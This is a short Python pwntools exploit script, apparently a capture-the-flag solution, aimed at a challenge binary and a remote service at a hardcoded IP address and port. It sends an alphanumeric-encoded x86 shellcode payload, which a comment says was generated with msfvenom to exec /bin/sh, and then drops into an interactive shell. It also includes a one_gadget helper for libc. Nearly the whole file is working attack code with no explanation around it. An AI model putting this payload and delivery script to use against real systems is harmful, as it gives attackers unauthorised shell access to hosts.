from pwn import *
import binascii
import subprocess

file_crack = './chall2'
glibc = '/lib/x86_64-linux-gnu/libc.so.6'
domain_name = '202.38.93.241'
port = 10002
remo = 1
archive = 'amd64'

context(os='linux', arch=archive, log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def one_gadget(filename):
  return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

def complement_code_32(num):
    return num & 0xffffffff
def complement_code_64(num):
    return num & 0xffffffffffffffff

elf = ELF(file_crack)
if remo:
    n = remote(domain_name, port)
else:
    n = elf.process()

one_gadget_ = one_gadget(glibc)
log.info(map(lambda x: hex(x), one_gadget_))
# msfvenom -a x86 --platform linux -p linux/x86/exec CMD="/bin/sh" -e x86/alpha_upper BufferRegister=eax
pay = 'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJTK0XZ9V2U62HFMBCMYJGRHFORSE8EP2HFO3R3YBNLIJC1BZHDHS05PS06ORB2IRNFOT3RH30PWF3MYKQXMK0AA'
n.send(pay)
n.interactive()
